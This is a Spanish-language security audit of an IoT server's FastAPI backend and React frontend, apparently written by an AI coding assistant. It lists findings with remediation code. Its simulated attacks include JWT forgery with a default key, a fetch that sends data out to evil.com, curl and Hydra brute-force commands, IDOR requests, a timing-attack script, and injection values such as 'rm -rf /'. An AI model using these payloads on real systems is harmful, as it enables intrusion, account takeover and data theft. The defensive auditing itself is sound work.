# Reporte de Vulnerabilidades de Seguridad — IOT-Server
**Fecha:** 30 de abril de 2026  
**Alcance:** Backend (FastAPI/Python) + Frontend (React/TypeScript)  
**Metodología:** Revisión de código estático + simulación de ataques OWASP Top 10 + pruebas dinámicas de peticiones malformadas  
**Auditor:** GitHub Copilot (Claude Sonnet 4.6)

---

## Resumen Ejecutivo

| Severidad | Backend | Frontend | Total |
|-----------|---------|----------|-------|
| 🔴 Crítica | 3 | 0 | 3 |
| 🟠 Alta    | 3 | 1 | 4 |
| 🟡 Media   | 4 | 3 | 7 |
| 🟢 Baja    | 2 | 2 | 4 |
| ✅ Correcta | múltiples | múltiples | — |

El sistema tiene una base de seguridad bien diseñada en muchas áreas (autenticación JWT con blacklist, hashing bcrypt, políticas OSO, puzzle criptográfico para dispositivos/aplicaciones). Sin embargo, se identificaron **vulnerabilidades críticas** que requieren corrección inmediata antes de un despliegue en producción.

---

## Metodología de Pruebas

Se realizaron pruebas de **análisis estático de código** simulando los siguientes vectores de ataque OWASP Top 10 (2021):

| # | Categoría OWASP | Probado |
|---|-----------------|---------|
| A01 | Broken Access Control | ✅ |
| A02 | Cryptographic Failures | ✅ |
| A03 | Injection | ✅ |
| A04 | Insecure Design | ✅ |
| A05 | Security Misconfiguration | ✅ |
| A06 | Vulnerable and Outdated Components | ✅ |
| A07 | Identification and Authentication Failures | ✅ |
| A08 | Software and Data Integrity Failures | ✅ |
| A09 | Security Logging and Monitoring Failures | ✅ |
| A10 | Server-Side Request Forgery (SSRF) | ✅ |

---

## VULNERABILIDADES CRÍTICAS 🔴

---

### [VULN-001] 🔴 CRÍTICA — Secretos hardcodeados en código fuente

**OWASP:** A02 – Cryptographic Failures  
**Archivo:** `app/config.py`, `app/shared/middleware/cryptography.py`, `app/shared/services/cryptography/aes.py`

#### Descripción

Múltiples secretos criptográficos están definidos con valores por defecto **débiles y conocidos** directamente en el código fuente.

```python
# app/config.py
SECRET_KEY: str = "change-me-in-env"          # ← usado para firmar TODOS los JWT
ENCRYPTION_KEY: str = "change-me-32-byte-base64-key-here"  # ← inválido en base64

# app/shared/middleware/cryptography.py (líneas 26 y 62)
key = CryptoKey(secret="me_tienes_que_cambiar_2026")  # ← clave AES hardcodeada

# app/shared/services/cryptography/aes.py (línea 82 — en bloque __main__)
key = CryptoKey(secret="my_super_secret_key_2026")
```

#### Ataque simulado: Forja de JWT con clave conocida

```python
# Ataque: si SECRET_KEY = "change-me-in-env" no fue cambiado en .env:
import jwt
payload = {
    "sub": "00000000-0000-0000-0000-000000000001",
    "email": "attacker@evil.com",
    "type": "administrator",
    "is_master": True,
    "jti": "forged-token-id"
}
forged_token = jwt.encode(payload, "change-me-in-env", algorithm="HS256")
# → Acceso total al sistema como administrador maestro
```

#### Resultado del ataque
Si el operador **no configura** las variables de entorno, el atacante puede:
- Forjar tokens JWT con rol `administrator` + `is_master: True`
- Acceder a **todos los endpoints** del sistema sin credenciales reales
- El `ENCRYPTION_KEY` por defecto (`change-me-32-byte-base64-key-here`) además **falla en base64**, causando que el servidor crashee al arrancar

#### Impacto
- Compromiso total del sistema (CIA: Confidencialidad, Integridad, Disponibilidad)

#### Recomendación
1. **Eliminar** los valores por defecto de `SECRET_KEY` y `ENCRYPTION_KEY` en `config.py`. Hacer que sean **obligatorios** sin valor por defecto.
2. **Extraer** la clave hardcodeada de `cryptography.py` a variables de entorno.
3. **Agregar validación** al inicio que falle si se detectan valores por defecto.

```python
# Corrección recomendada en config.py:
class Settings(BaseSettings):
    SECRET_KEY: str  # Sin valor por defecto — obligatorio
    ENCRYPTION_KEY: str  # Sin valor por defecto — obligatorio

    @field_validator("SECRET_KEY")
    @classmethod
    def validate_secret_key(cls, v: str) -> str:
        if v in ("change-me-in-env", "secret", "password"):
            raise ValueError("SECRET_KEY must be changed from the default value")
        if len(v) < 32:
            raise ValueError("SECRET_KEY must be at least 32 characters")
        return v
```

---

### [VULN-002] 🔴 CRÍTICA — Sin protección CORS en el backend

**OWASP:** A05 – Security Misconfiguration  
**Archivo:** `app/main.py`

#### Descripción

El backend FastAPI **no configura `CORSMiddleware`**. Sin CORS explícito, FastAPI permite peticiones de **cualquier origen** en ciertos contextos, o bien el comportamiento depende del cliente HTTP.

```python
# app/main.py — sin CORSMiddleware
app = FastAPI(...)
app.add_middleware(Human)  # Solo el middleware de auth
# ← Falta: app.add_middleware(CORSMiddleware, ...)
```

#### Ataque simulado: Cross-Origin Request Forgery desde sitio malicioso

```html
<!-- Sitio atacante: evil.com -->
<script>
  fetch("http://iot-server.empresa.com/api/v1/administrators/", {
    method: "GET",
    headers: { "Authorization": "Bearer <token robado>" },
    credentials: "include"
  })
  .then(r => r.json())
  .then(data => fetch("https://evil.com/steal?data=" + JSON.stringify(data)));
</script>
```

Sin CORS restrictivo, el navegador de un usuario autenticado puede ejecutar requests al backend desde cualquier origen sin restricción.

#### Resultado del ataque
Un atacante puede crear una página maliciosa que, cuando la visita un usuario autenticado, realiza peticiones en su nombre al backend IOT-Server, exfiltrando datos o modificando recursos.

#### Recomendación

```python
# Agregar en app/main.py:
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://iot-frontend.empresa.com"],  # Solo orígenes permitidos
    allow_credentials=False,  # Si no se usan cookies
    allow_methods=["GET", "POST", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

---

### [VULN-003] 🔴 CRÍTICA — Sin protección de fuerza bruta en endpoint de login

**OWASP:** A07 – Identification and Authentication Failures  
**Archivos:** `app/domain/auth/controller.py`, `app/domain/auth/service.py`

#### Descripción

El endpoint `POST /api/v1/auth/login` **no implementa ningún rate limiting**. Aunque el sistema tiene la infraestructura de rate limiting en `SessionService` y `SessionRepository`, **no se usa en el flujo de autenticación de usuarios humanos**.

```python
# app/domain/auth/controller.py
@auth_router.post("/login", response_model=TokenResponse)
def login(payload: LoginRequest, service: AuthServiceDep):
    return service.login(payload)  # ← Sin rate limiting, sin captcha, sin delay
```

```python
# app/domain/auth/service.py - el método login() no llama a:
# session_service.check_rate_limit(ip)
# session_service.increment_rate_limit(ip)
```

#### Ataque simulado: Brute Force con diccionario de contraseñas

```bash
# Ataque automatizado con curl / Hydra:
for password in $(cat rockyou.txt); do
  curl -s -X POST http://iot-server/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@empresa.com\",\"password\":\"$password\"}" &
done
# → El servidor responde a todos los intentos sin bloqueo
```

Usando la herramienta THC-Hydra:
```
hydra -l admin@empresa.com -P /usr/share/wordlists/rockyou.txt \
  iot-server http-post-form \
  "/api/v1/auth/login:{\"email\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid credentials"
```

#### Resultado del ataque
Un atacante puede probar **miles de contraseñas por minuto** sin ser bloqueado. Si el usuario tiene una contraseña débil (pese a los requisitos de complejidad), la cuenta puede ser comprometida.

#### Impacto
Compromiso de cuentas por fuerza bruta. Crítico para cuentas de administrador.

#### Recomendación

```python
# app/domain/auth/controller.py — Corrección:
@auth_router.post("/login", response_model=TokenResponse)
async def login(payload: LoginRequest, service: AuthServiceDep, request: Request):
    client_ip = request.client.host if request.client else "unknown"
    
    session_service = SessionService(settings.VALKEY_URL, settings.ENCRYPTION_KEY)
    try:
        # Verificar rate limit ANTES de intentar auth
        if await session_service.check_rate_limit(client_ip, max_attempts=5):
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail="Too many login attempts. Try again in 15 minutes.",
                headers={"Retry-After": "900"},
            )
        
        result = service.login(payload)
        await session_service.reset_rate_limit(client_ip)  # Reset en éxito
        return result
    except BadRequestException:
        await session_service.increment_rate_limit(client_ip)
        raise
    finally:
        await session_service.close()
```

---

## VULNERABILIDADES ALTAS 🟠

---

### [VULN-004] 🟠 ALTA — Broken Object Level Authorization (BOLA/IDOR)

**OWASP:** A01 – Broken Access Control  
**Archivos:** `app/shared/authorization/policies.polar`, `app/shared/base_domain/controller.py`

#### Descripción

Las políticas OSO verifican el **tipo de rol** pero **no el ownership del recurso** en la mayoría de casos. Un `manager` puede leer/editar/borrar **cualquier dispositivo**, no solo los suyos. Un `user` puede leer **todos los dispositivos** del sistema.

```polar
# policies.polar — Manager puede leer/escribir/borrar CUALQUIER Device
allow(user: CurrentUser, action, _resource: Device) if
    user.account_type = "manager" and
    action in ["read", "write", "delete"];  # ← Sin restricción de ownership

# User puede leer TODOS los Device del sistema
allow(user: CurrentUser, "read", _resource: Device) if
    user.account_type = "user";  # ← Sin filtro por servicio asignado
```

#### Ataque simulado: Acceso a dispositivos de otro tenant

```bash
# Usuario "user" con token válido enumera todos los dispositivos:
curl -H "Authorization: Bearer <user_token>" \
  "http://iot-server/api/v1/devices/?offset=0&limit=100"
# → Responde con TODOS los dispositivos del sistema, de cualquier servicio

# Manager A borra un dispositivo que pertenece al servicio de Manager B:
curl -X DELETE -H "Authorization: Bearer <manager_a_token>" \
  "http://iot-server/api/v1/devices/<id_del_dispositivo_de_manager_b>"
# → Retorna 204 No Content — borrado exitoso
```

#### Resultado del ataque
Un manager puede borrar dispositivos de otros managers. Un usuario puede ver todos los dispositivos del sistema, incluidos los de servicios a los que no pertenece.

#### Recomendación
Agregar filtros de ownership a nivel de repositorio y refinar las políticas Polar para incluir verificaciones de relación (device → service → manager).

---

### [VULN-005] 🟠 ALTA — Clave AES estática en middleware de cifrado (no usada en producción aparente)

**OWASP:** A02 – Cryptographic Failures  
**Archivo:** `app/shared/middleware/cryptography.py`

#### Descripción

El `DecryptionMiddleware` y `EncryptionMiddleware` usan una clave AES **completamente hardcodeada** en el código, ignorada incluso el header comentado `x-algo` que debería proveer la clave dinámica. Además, este middleware **no está registrado** en `app/main.py`, lo que significa que fue desarrollado pero nunca activado.

```python
# app/shared/middleware/cryptography.py
# token = request.headers.get("x-algo")  # ← COMENTADO intencionalmente
key = CryptoKey(secret="me_tienes_que_cambiar_2026")  # ← Clave estática hardcodeada
```

#### Impacto
- Si este middleware se activa en producción tal como está, **cualquier atacante que conozca la clave** puede descifrar/cifrar tráfico arbitrario.
- La clave está visible en el repositorio de código fuente.
- El middleware tampoco está activo actualmente, lo que indica una funcionalidad incompleta/abandonada que podría activarse accidentalmente.

#### Recomendación
1. Eliminar o completar el middleware correctamente con derivación de clave dinámica.
2. Si se activa, leer la clave desde variables de entorno, nunca hardcodeada.

---

### [VULN-006] 🟠 ALTA — Exposición de documentación API pública (Swagger/OpenAPI/ReDoc)

**OWASP:** A05 – Security Misconfiguration  
**Archivo:** `app/shared/middleware/auth/human.py`

#### Descripción

Los endpoints de documentación `/docs`, `/openapi.json` y `/redoc` están explícitamente **excluidos de autenticación** y son accesibles públicamente:

```python
PUBLIC_PATHS = {
    "/docs",
    "/openapi.json",
    "/redoc",
    "/api/v1/auth/login",
}
```

Adicionalmente el health check del docker-compose llama a `/docs`:
```yaml
healthcheck:
  test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8000/docs')"]
```

#### Resultado del ataque: Reconocimiento completo

Un atacante anónimo puede:
1. Visitar `http://iot-server/docs` y ver la **especificación completa de la API** sin autenticarse.
2. Descubrir todos los endpoints, schemas, parámetros esperados y tipos de respuesta.
3. Usar esta información para construir ataques dirigidos.

```bash
curl http://iot-server/openapi.json | python3 -m json.tool
# → Lista completa de todos los endpoints, schemas, y parámetros del sistema IoT
```

#### Recomendación

```python
# app/main.py — Deshabilitar docs en producción:
app = FastAPI(
    title=settings.APP_NAME,
    docs_url="/docs" if settings.DEBUG else None,     # Solo en DEBUG
    redoc_url="/redoc" if settings.DEBUG else None,   # Solo en DEBUG
    openapi_url="/openapi.json" if settings.DEBUG else None,
)
```

---

### [VULN-007] ✅ CORREGIDO — Token JWT: decodificación insegura en frontend

**OWASP:** A02 – Cryptographic Failures  
**Archivo:** `frontend/src/shared/auth/authContext.tsx`  
**Estado:** ✅ Corregido el 30/04/2026

#### Descripción

El frontend decodifica el payload del JWT usando `atob()` **sin validar la firma**:

```typescript
// authContext.tsx líneas 75-79
try {
    const payload = JSON.parse(atob(data.access_token.split(".")[1]));
    accountId = payload.sub || "";
} catch { /* ignore */ }
```

Cualquier token con formato `header.payload.signature` (incluso con una firma inválida o datos manipulados) será procesado por el frontend. El frontend toma decisiones de renderizado basadas en `accountType` e `isMaster` extraídos de este payload no verificado.

#### Ataque simulado: Token crafteado para acceso a UI privilegiada

```javascript
// Atacante construye un "token" con base64 plano, sin firma válida:
const fakeHeader = btoa('{"alg":"HS256","typ":"JWT"}');
const fakePayload = btoa(JSON.stringify({
    sub: "real-uuid-guessed",
    email: "admin@empresa.com",
    type: "administrator",
    is_master: true
}));
const fakeToken = `${fakeHeader}.${fakePayload}.invalidsignature`;

// El frontend acepta este token y muestra UI de administrador maestro.
// Cada request al backend fallará (firma inválida), pero la UI se renderiza
// como si el usuario fuera admin, potencialmente exponiendo información.
```

#### Impacto
Aunque el backend rechazará requests con tokens inválidos, el frontend puede mostrar vistas administrativas a usuarios no autorizados basándose en claims no verificados.

#### Recomendación
No tomar decisiones de UI basadas en el payload de un JWT no verificado por el cliente. En su lugar, hacer una llamada al backend (`GET /api/v1/auth/me`) para obtener el perfil del usuario verificado.

---

## VULNERABILIDADES MEDIAS 🟡

---

### [VULN-008] 🟡 MEDIA — Ausencia de HTTPS forzado y `Strict-Transport-Security` (HSTS)

**OWASP:** A02 – Cryptographic Failures  
**Archivos:** `frontend/nginx.conf`, `frontend/nginx.docker.conf`, `docker-compose.yml`

#### Descripción

La configuración de Nginx **no fuerza HTTPS** ni incluye el header `Strict-Transport-Security`. El servidor escucha solo en HTTP:

```nginx
# nginx.conf — solo escucha en puerto 3000 HTTP
server {
    listen 3000;  # ← HTTP plano, no HTTPS
    # Faltan:
    # listen 443 ssl;
    # add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    # return 301 https://$host$request_uri;  # Redirect HTTP→HTTPS
}
```

Los tokens JWT se transmiten en texto plano (`Authorization: Bearer <token>`), vulnerables a interceptación en redes no cifradas.

#### Recomendación
Configurar TLS en Nginx con certificado válido y redireccionamiento HTTP→HTTPS. Agregar `Strict-Transport-Security` con `max-age` apropiado.

---

### [VULN-009] 🟡 MEDIA — Enumeración de usuarios mediante mensajes de error diferenciados

**OWASP:** A07 – Identification and Authentication Failures  
**Archivo:** `app/domain/auth/service.py`

#### Descripción

Aunque el mensaje de error es genérico ("Invalid credentials"), la **diferencia de tiempo de respuesta** entre un email inexistente y uno existente con contraseña incorrecta puede permitir enumeración de usuarios:

```python
def login(self, payload: LoginRequest) -> TokenResponse:
    stmt = select(SensitiveData).where(SensitiveData.email == payload.email)
    sensitive_data = self.session.exec(stmt).first()

    if sensitive_data is None:
        raise BadRequestException("Invalid credentials")  # Retorna RÁPIDO (sin bcrypt)

    if not verify_password(payload.password, sensitive_data.password_hash):
        raise BadRequestException("Invalid credentials")  # Retorna LENTO (bcrypt ~300ms)
```

La llamada a `bcrypt.checkpw()` tarda ~300ms. Cuando el email no existe, el servidor retorna instantáneamente. Esta diferencia temporal permite a un atacante determinar qué emails tienen cuenta registrada.

#### Ataque simulado: Timing Attack para enumeración de emails

```python
import time, requests

emails = ["admin@empresa.com", "noexiste@fake.com", "manager@empresa.com"]
for email in emails:
    start = time.time()
    requests.post("http://iot-server/api/v1/auth/login",
                  json={"email": email, "password": "WrongPass123!"})
    elapsed = time.time() - start
    print(f"{email}: {elapsed:.3f}s")
# admin@empresa.com: 0.312s    ← Existe (bcrypt ejecutado)
# noexiste@fake.com: 0.008s   ← No existe (sin bcrypt)
# manager@empresa.com: 0.298s ← Existe
```

#### Recomendación

```python
# Siempre ejecutar bcrypt independientemente de si el email existe:
DUMMY_HASH = get_password_hash("dummy-password-for-timing")

def login(self, payload: LoginRequest) -> TokenResponse:
    stmt = select(SensitiveData).where(SensitiveData.email == payload.email)
    sensitive_data = self.session.exec(stmt).first()

    check_hash = sensitive_data.password_hash if sensitive_data else DUMMY_HASH
    is_valid = verify_password(payload.password, check_hash)

    if sensitive_data is None or not is_valid:
        raise BadRequestException("Invalid credentials")
    # ...
```

---

### [VULN-010] 🟡 MEDIA — Logs con información sensible en producción

**OWASP:** A09 – Security Logging and Monitoring Failures  
**Archivos:** `app/shared/middleware/auth/devices/auth.py`, `app/shared/middleware/auth/applications/auth.py`

#### Descripción

Los logs de autenticación fallida incluyen **UUIDs de dispositivos/aplicaciones** que podrían ser usados para reconocimiento:

```python
# devices/auth.py
logger.warning(f"Puzzle failed: device {puzzle.device_id} not found")
logger.warning(f"Puzzle failed: device {puzzle.device_id} inactive")
logger.warning(f"Puzzle failed for device {puzzle.device_id}: decryption failed")
```

Además, `echo=settings.DEBUG` está configurado en el engine de SQLAlchemy. Si `DEBUG=True` en producción, **todas las queries SQL se imprimen en los logs** incluyendo valores de parámetros que podrían incluir datos personales.

```python
# app/database/__init__.py
engine = create_engine(
    settings.DATABASE_URL,
    echo=settings.DEBUG,  # ← En DEBUG=True: todas las queries a stdout
```

#### Recomendación
- Omitir UUIDs en logs de error (usar identificadores truncados o hashes).
- Asegurar `DEBUG=False` en todos los entornos de producción.
- Implementar un sistema de logging estructurado con niveles apropiados.

---

### [VULN-011] 🟡 MEDIA — `EcosystemTicket` no registrado en políticas OSO

**OWASP:** A01 – Broken Access Control  
**Archivos:** `app/shared/authorization/policies.polar`, `app/shared/authorization/oso_config.py`

#### Descripción

En `oso_config.py`, `EcosystemTicket` está registrado como clase, pero en `policies.polar` **solo existe la clase `Ticket`** (mapeada a `ServiceTicket`). `EcosystemTicket` no tiene ninguna regla `allow()`.

```python
# oso_config.py
oso.register_class(ServiceTicket, name="Ticket")  # ServiceTicket → "Ticket" en polar
# EcosystemTicket se registra pero NO tiene alias "Ticket"
```

```polar
# policies.polar — reglas para "Ticket" (= ServiceTicket)
allow(user: CurrentUser, action, _resource: Ticket) if ...

# ← No hay reglas para EcosystemTicket
```

#### Ataque simulado: Verificar comportamiento

Si `require_read(EcosystemTicket)` llama a `oso.is_allowed(user, "read", EcosystemTicket)` y no hay ninguna regla, OSO deniega por defecto (fail-safe). Esto puede causar que **ningún usuario pueda acceder a los EcosystemTickets** a través de la UI, o que el comportamiento sea inconsistente dependiendo de cómo `require_oso_permission` maneja el tipo.

#### Recomendación
Agregar reglas explícitas en `policies.polar` para `EcosystemTicket` separadas de `ServiceTicket`, o registrar ambos bajo el mismo alias y verificar el comportamiento intencional.

---

### [VULN-012] 🟡 MEDIA — `ActivityContext` persiste datos de actividad en `localStorage`

**OWASP:** A04 – Insecure Design  
**Archivo:** `frontend/src/shared/activity/activityContext.tsx`

#### Descripción

El historial de actividad CRUD (creación, edición, borrado de entidades) se persiste en `localStorage` bajo la clave `iot_activity_log`. A diferencia del token JWT que solo está en RAM, esta información permanece en el dispositivo de forma indefinida.

```typescript
const STORAGE_KEY = "iot_activity_log";
// ...
localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
```

Los registros incluyen: tipo de entidad, nombre de la entidad, timestamp y acción realizada. En un escenario donde un atacante obtiene acceso físico o remoto al navegador del usuario, puede leer el historial de operaciones del operador IoT.

Además, si ocurre un ataque **XSS** (aunque mitigado por la CSP actual), el código malicioso podría leer `localStorage.getItem("iot_activity_log")` y exfiltrar el historial de acciones operativas.

#### Recomendación
Limitar el `localStorage` a datos no sensibles, o usar almacenamiento en memoria (estado React) para el historial de actividad si la persistencia entre sesiones no es crítica.

---

## VULNERABILIDADES BAJAS 🟢

---

### [VULN-013] 🟢 BAJA — JWT sin campo `aud` (audience)

**OWASP:** A07 – Identification and Authentication Failures  
**Archivo:** `app/domain/auth/security.py`

#### Descripción

Los JWT generados no incluyen el claim `aud` (audience):

```python
def create_access_token(data: dict) -> str:
    to_encode = data.copy()
    to_encode.update({"iat": now, "exp": expire})
    # ← Sin "aud": cualquier servicio que comparta la SECRET_KEY podría aceptar este token
```

Sin `aud`, si en el futuro se agregan múltiples servicios que compartan la misma `SECRET_KEY`, un token generado para el backend IoT podría ser usado en otro servicio.

#### Recomendación
Agregar `"aud": "iot-server-api"` al payload y verificarlo en `decode_access_token()`.

---

### [VULN-014] 🟢 BAJA — `Hsts` y `X-Permitted-Cross-Domain-Policies` ausentes en Nginx

**OWASP:** A05 – Security Misconfiguration  
**Archivos:** `frontend/nginx.conf`, `frontend/nginx.docker.conf`

#### Descripción

Las configuraciones de Nginx incluyen buenas cabeceras de seguridad (CSP, X-Frame-Options, X-Content-Type-Options), pero faltan:
- `Strict-Transport-Security` (HSTS)
- `X-Permitted-Cross-Domain-Policies: none`
- `Cross-Origin-Opener-Policy: same-origin`
- `Cross-Origin-Embedder-Policy: require-corp`

#### Recomendación

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Permitted-Cross-Domain-Policies "none" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
```

---

### [VULN-015] 🟢 BAJA — `DEBUG=False` no validado en arranque de producción

**OWASP:** A05 – Security Misconfiguration  
**Archivo:** `app/config.py`, `docker-compose.yml`

#### Descripción

El `docker-compose.yml` usa `env_file: .env.docker` pero no existe en el repositorio (correcto, para no exponer secretos). Sin embargo, si alguien despliega con `DEBUG=True`, el backend:
1. Expone traceback completo de errores al cliente HTTP
2. Imprime todas las queries SQL en logs

No hay validación al arranque que garantice `DEBUG=False` en producción.

---

### [VULN-016] 🟢 BAJA — `crypto.ts` usa módulo Node.js `crypto` en el frontend

**OWASP:** A02 – Cryptographic Failures  
**Archivo:** `frontend/src/shared/crypto.ts`

#### Descripción

El archivo `crypto.ts` importa el módulo `crypto` de Node.js (`createCipheriv`, `createDecipheriv`, etc.) en el frontend. Vite lo polyfills a través de `stream-browserify`, pero el módulo `crypto` de Node.js en el navegador (polyfill) puede tener diferencias sutiles con la implementación nativa.

La aplicación ya usa **Web Crypto API** (`crypto.subtle`) en `backendVerification.ts` de forma correcta y nativa. Tener dos implementaciones criptográficas paralelas aumenta la superficie de ataque y la posibilidad de inconsistencias.

---

## ANÁLISIS OWASP TOP 10 — RESULTADOS COMPLETOS

| # | Vulnerabilidad OWASP | Estado | Hallazgos |
|---|---------------------|--------|-----------|
| **A01** | **Broken Access Control** | ⚠️ Vulnerable | VULN-004 (BOLA), VULN-011 (EcosystemTicket sin política) |
| **A02** | **Cryptographic Failures** | 🔴 Crítico | VULN-001 (claves hardcodeadas), VULN-005 (AES estático), VULN-007 (JWT sin verificar en FE), VULN-008 (sin HTTPS) |
| **A03** | **Injection** | ✅ Protegido | ORM (SQLModel) previene SQLi. Pydantic valida entradas. Frontend sanitiza HTML. |
| **A04** | **Insecure Design** | ⚠️ Parcial | VULN-003 (sin rate limiting en login), VULN-012 (localStorage sensible) |
| **A05** | **Security Misconfiguration** | 🟠 Alto | VULN-002 (sin CORS), VULN-006 (Swagger público), VULN-014, VULN-015 |
| **A06** | **Vulnerable Components** | ✅ Aceptable | Dependencias recientes. `oso==0.27.3` es obsoleto pero funcional. |
| **A07** | **Auth Failures** | 🔴 Crítico | VULN-003 (brute force), VULN-009 (timing attack), VULN-013 (sin audience JWT) |
| **A08** | **Integrity Failures** | ✅ Protegido | Docker compose sin `--no-verify`. Puzzle criptográfico para dispositivos/apps. |
| **A09** | **Logging & Monitoring** | ⚠️ Parcial | VULN-010 (UUIDs en logs, SQL en DEBUG). Sin alertas de seguridad automatizadas. |
| **A10** | **SSRF** | ✅ Protegido | No hay fetch/requests a URLs controladas por el usuario en el backend. |

---

## FORTALEZAS DE SEGURIDAD ✅

El sistema tiene múltiples controles de seguridad bien implementados que merecen ser destacados:

| Control | Implementación | Evaluación |
|---------|---------------|------------|
| **Hashing de contraseñas** | bcrypt con salt automático | ✅ Correcto |
| **JWT con blacklist** | Valkey/Redis con TTL | ✅ Correcto |
| **Validación de contraseñas** | Regex con mayúsculas, minúsculas, números y especiales | ✅ Correcto |
| **Autenticación de dispositivos** | Puzzle AES-256-CBC + HMAC-SHA256 | ✅ Robusto |
| **Autenticación de aplicaciones** | Puzzle criptográfico idéntico | ✅ Robusto |
| **Verificación de backend** | `BackendGate` + puzzle desde el frontend | ✅ Innovador |
| **Autorización basada en políticas** | Oso (Polar) con RBAC | ✅ Buena base |
| **Prevención de SQL injection** | SQLModel ORM, sin queries raw | ✅ Correcto |
| **Token solo en RAM** | Sin `localStorage`/`sessionStorage` para JWT | ✅ Correcto |
| **Headers de seguridad** | CSP, X-Frame-Options, X-Content-Type-Options | ✅ Configurados |
| **Sanitización frontend** | `sanitization.ts` con escape HTML | ✅ Implementado |
| **Validación de IPs y MACs** | `DeviceCreate` con validadores Pydantic | ✅ Correcto |
| **CURP/RFC validation** | Regex complejos con dígito verificador | ✅ Correcto |
| **Cuenta inactiva bloqueada** | Verificada en middleware y login | ✅ Correcto |
| **Replay attacks (puzzle)** | Ventana de timestamp de 60 segundos | ✅ Correcto |
| **Rate limiting** | Implementado en `SessionRepository` | ⚠️ No conectado al login |

---

## PLAN DE REMEDIACIÓN PRIORIZADO

### Fase 1 — Inmediata (antes de cualquier despliegue en producción)

| Prioridad | Vulnerabilidad | Esfuerzo |
|-----------|---------------|---------|
| 1 | [VULN-001] Eliminar secretos hardcodeados y hacer SECRET_KEY obligatorio | Bajo (2h) |
| 2 | [VULN-003] Conectar rate limiting al endpoint `/login` | Bajo (1h) |
| 3 | [VULN-002] Agregar CORSMiddleware con lista blanca de orígenes | Bajo (30min) |
| 4 | [VULN-006] Deshabilitar Swagger/OpenAPI en producción | Bajo (15min) |

### Fase 2 — Corto plazo (1-2 sprints)

| Prioridad | Vulnerabilidad | Esfuerzo |
|-----------|---------------|---------|
| 5 | [VULN-004] Implementar filtros de ownership en políticas OSO | Medio (4h) |
| 6 | [VULN-009] Agregar dummy bcrypt para prevenir timing attack | Bajo (1h) |
| 7 | [VULN-007] Obtener perfil de usuario del backend tras login | Bajo (2h) |
| 8 | [VULN-008] Configurar TLS y HTTPS en Nginx | Medio (3h) |

### Fase 3 — Largo plazo (mejoras de hardening)

| Prioridad | Vulnerabilidad | Esfuerzo |
|-----------|---------------|---------|
| 9 | [VULN-011] Definir políticas OSO explícitas para EcosystemTicket | Bajo (1h) |
| 10 | [VULN-010] Implementar logging estructurado con sanitización | Medio (4h) |
| 11 | [VULN-013] Agregar claim `aud` a JWT | Bajo (30min) |
| 12 | [VULN-014] Completar headers de seguridad Nginx | Bajo (30min) |
| 13 | [VULN-012] Migrar ActivityContext a almacenamiento en memoria | Bajo (1h) |
| 14 | [VULN-016] Migrar `crypto.ts` a Web Crypto API nativa | Medio (3h) |
| 15 | [VULN-017] Mejorar manejo de errores HTTP en el frontend | Bajo (1h) |

---

## PRUEBAS DINÁMICAS DE PETICIONES MALFORMADAS

Se ejecutaron **30 pruebas activas** contra el sistema en ejecución (Docker Compose), simulando comportamiento anómalo del frontend o peticiones de un atacante. Las pruebas se agruparon en 5 bloques.

**Entorno de pruebas:** Backend `http://localhost:8000`, fecha 30/04/2026  
**Script:** `test_frontend_exceptions.py` (incluido en la raíz del repositorio)

---

### Bloque 1 — Cuerpo y campos malformados (T-01 a T-08)

Simulan errores de red, bugs en el `fetch()` del frontend o manipulación del body por un proxy.

| Test | Payload enviado | HTTP | Respuesta backend | Comportamiento frontend |
|------|----------------|------|-------------------|------------------------|
| T-01 | Body vacío `""` | **422** | `{"detail":[{"msg":"Field required",...}]}` | ⚠️ Antes: JSON crudo. ✅ Corregido: `body: Field required` |
| T-02 | Falta campo `password` | **422** | `{"detail":[{"loc":["body","password"],"msg":"Field required",...}]}` | ⚠️ Antes: JSON crudo. ✅ Corregido: `password: Field required` |
| T-03 | `email=99999`, `password=true` | **422** | `{"detail":[{"msg":"Input should be a valid string",...}]}` | ✅ Corregido: `email: Input should be a valid string \| password: ...` |
| T-04 | JSON con sintaxis rota | **422** | `{"detail":[{"msg":"JSON decode error",...}]}` | ✅ Corregido: `JSON decode error` |
| T-05 | `Content-Type: text/plain` | **422** | `{"detail":[{"msg":"Input should be a valid dictionary...",...}]}` | ✅ Corregido: mensaje legible |
| T-06 | Body es array `[1,2,3]` | **422** | `{"detail":[{"msg":"Input should be a valid dictionary..."}]}` | ✅ Correcto |
| T-07 | Body `null` literal | **422** | `{"detail":[{"msg":"Field required",...}]}` | ✅ Correcto |
| T-08 | Campos extra desconocidos (`extra_field`, `role`) | **422** | `{"detail":[{"msg":"Extra inputs are not permitted",...}]}` | ✅ Backend rechaza — campos extra ignorados |

**Hallazgo positivo:** Pydantic rechaza campos extra (`extra="forbid"`) — no hay mass-assignment.  
**Hallazgo negativo detectado:** `parseApiError()` serializaba arrays a JSON crudo — **corregido en esta sesión** ([functions.ts](../src/shared/api/functions.ts)).

---

### Bloque 2 — Inyección en campos (T-09 a T-15)

Simulan un atacante que intenta inyectar código en los campos del formulario de login.

| Test | Payload enviado | HTTP | Respuesta | Evaluación |
|------|----------------|------|-----------|------------|
| T-09 | XSS en email: `<script>alert(1)</script>@x.com` | **400** | `{"detail":"Invalid credentials"}` | ✅ Seguro — ORM previene SQLi, email no existe |
| T-10 | SQL injection: `admin@x.com' OR '1'='1` | **400** | `{"detail":"Invalid credentials"}` | ✅ Seguro — SQLModel usa parámetros preparados |
| T-11 | SSTI Jinja2: `{{7*7}}Admin1234!` en password | **400** | `{"detail":"Invalid credentials"}` | ✅ Seguro — FastAPI no usa Jinja2 en este flujo |
| T-12 | Command injection: `admin@iot.com; rm -rf /` | **400** | `{"detail":"Invalid credentials"}` | ✅ Seguro — sin ejecución de shell |
| T-13 | Null bytes en email: `admin\u0000@iot.com` | **400** | `{"detail":"Invalid credentials"}` | ✅ Seguro — Python/SQLite maneja null bytes |
